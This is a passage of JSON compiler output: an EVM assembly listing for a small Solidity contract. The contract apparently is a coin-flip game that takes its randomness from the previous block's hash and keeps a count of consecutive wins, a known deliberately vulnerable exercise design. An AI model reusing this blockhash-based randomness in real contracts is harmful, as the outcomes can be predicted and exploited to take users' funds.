									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 65,
									"end": 793,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 65,
									"end": 793,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 65,
									"end": 793,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 65,
									"end": 793,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 65,
									"end": 793,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 65,
									"end": 793,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220482a8f1b0bdf0f239afa5679974bb9be95f3f3c7b90e3def45056861dddd664664736f6c634300080d0033",
									".code": [
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 65,
											"end": 793,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 65,
											"end": 793,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 380,
											"end": 384,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 393,
											"end": 411,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 432,
											"end": 451,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 449,
											"end": 450,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 432,
											"end": 444,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 432,
											"end": 448,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 432,
											"end": 448,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 432,
											"end": 451,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 432,
											"end": 451,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 432,
											"end": 451,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 432,
											"end": 451,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 432,
											"end": 451,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 432,
											"end": 451,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 432,
											"end": 451,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 422,
											"end": 452,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 414,
											"end": 453,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 414,
											"end": 453,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 393,
											"end": 453,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 393,
											"end": 453,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 478,
											"end": 488,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 474,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 466,
											"end": 474,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 466,
											"end": 488,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 462,
											"end": 515,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 462,
											"end": 515,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 499,
											"end": 507,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 499,
											"end": 507,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 499,
											"end": 507,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 462,
											"end": 515,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 462,
											"end": 515,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 534,
											"end": 544,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 523,
											"end": 531,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 523,
											"end": 544,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 523,
											"end": 544,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 523,
											"end": 544,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 523,
											"end": 544,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 551,
											"end": 567,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 570,
											"end": 592,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 585,
											"end": 591,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 585,
											"end": 591,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 570,
											"end": 580,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 570,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 570,
											"end": 584,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 570,
											"end": 592,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 570,
											"end": 592,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 570,
											"end": 592,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 570,
											"end": 592,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 570,
											"end": 592,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 570,
											"end": 592,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 570,
											"end": 592,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 551,
											"end": 592,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 551,
											"end": 592,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 599,
											"end": 608,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 623,
											"end": 624,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 611,
											"end": 619,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 611,
											"end": 624,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 611,
											"end": 639,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 611,
											"end": 639,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 634,
											"end": 639,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 611,
											"end": 639,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 611,
											"end": 639,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 611,
											"end": 639,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 611,
											"end": 639,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 627,
											"end": 631,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 611,
											"end": 639,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 611,
											"end": 639,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 599,
											"end": 639,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 599,
											"end": 639,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 660,
											"end": 666,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 652,
											"end": 666,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 652,
											"end": 666,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 652,
											"end": 656,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 652,
											"end": 666,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 652,
											"end": 666,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 652,
											"end": 666,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 648,
											"end": 785,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 648,
											"end": 785,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 677,
											"end": 692,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 677,
											"end": 692,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 677,
											"end": 694,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 677,
											"end": 694,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 677,
											"end": 694,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 677,
											"end": 694,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 710,
											"end": 714,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 703,
											"end": 714,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 703,
											"end": 714,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 703,
											"end": 714,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 703,
											"end": 714,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 703,
											"end": 714,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 703,
											"end": 714,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 703,
											"end": 714,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 648,
											"end": 785,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 648,
											"end": 785,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 755,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 737,
											"end": 752,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 737,
											"end": 756,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 737,
											"end": 756,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 737,
											"end": 756,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 737,
											"end": 756,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 772,
											"end": 777,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 765,
											"end": 777,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 765,
											"end": 777,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 337,
											"end": 790,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 121,
											"end": 151,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 121,
											"end": 151,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3271,
											"end": 3278,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3302,
											"end": 3303,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3298,
											"end": 3299,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 3298,
											"end": 3303,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3291,
											"end": 3303,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3291,
											"end": 3303,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3213,
											"end": 3311,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 4027,
											"end": 4034,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 4058,
											"end": 4059,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4055,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 4054,
											"end": 4059,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 4047,
											"end": 4059,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 4047,
											"end": 4059,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3969,
											"end": 4067,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "tag",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 334,
											"end": 424,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 368,
											"end": 375,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 416,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 404,
											"end": 417,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 397,
											"end": 418,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 386,
											"end": 418,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 386,
											"end": 418,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 430,
											"end": 546,
											"name": "tag",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 430,
											"end": 546,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 515,
											"end": 520,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 500,
											"end": 521,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 500,
											"end": 521,
											"name": "tag",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 500,
											"end": 521,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 493,
											"end": 498,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 490,
											"end": 522,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 480,
											"end": 540,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 536,
											"end": 537,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 533,
											"end": 534,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 526,
											"end": 538,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 480,
											"end": 540,
											"name": "tag",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 430,
											"end": 546,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 430,
											"end": 546,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 552,
											"end": 685,
											"name": "tag",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 552,
											"end": 685,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 595,
											"end": 600,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 639,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 620,
											"end": 640,
											"name": "CALLDATALOAD",
											"source": 3
										},
										{
											"begin": 611,
											"end": 640,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 611,
											"end": 640,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "53"
										},
										{
											"begin": 673,
											"end": 678,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 649,
											"end": 679,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 649,
											"end": 679,
											"name": "tag",
											"source": 3,
											"value": "53"
										},
										{
											"begin": 649,
											"end": 679,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
